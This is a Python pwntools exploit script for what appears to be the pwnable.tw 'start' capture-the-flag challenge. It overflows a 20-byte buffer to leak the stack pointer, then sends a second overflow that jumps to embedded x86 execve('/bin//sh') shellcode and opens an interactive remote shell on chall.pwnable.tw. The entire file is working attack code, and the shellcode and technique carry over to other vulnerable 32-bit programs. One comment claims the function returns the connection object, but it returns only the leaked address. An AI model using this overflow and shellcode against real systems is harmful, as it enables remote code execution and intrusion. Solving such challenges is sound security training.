from pwn import *

def leak(r):
    
    
    # 2. Construct the Stage 1 payload
    buff = b"A" * 20
    buff += p32(0x08048087) 
    
    # 3. Python 3 expects byte strings for network interactions
    r.recvuntil(b'CTF:') 
    r.send(buff)
    
    # 4. Read the exact 4 bytes of the leaked stack address
    leaked_bytes = r.recv(4)
    esp = u32(leaked_bytes)
    
    print(f"[+] Leaked ESP is at: {hex(esp)}")
    
    # 5. Return the connection object and the leak so you can use them for Stage 2
    return esp


def exploit(esp):
    buff = b"A"*20
    eip=p32(esp+20)
    shellc0de = b'\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'
    payload = buff+eip+shellc0de
    print("[+]Sending payload")
    r.send(payload)
    r.interactive()
    

if __name__ == '__main__':
    r = remote("chall.pwnable.tw", port=10000)
    esp = leak(r)
    exploit(esp)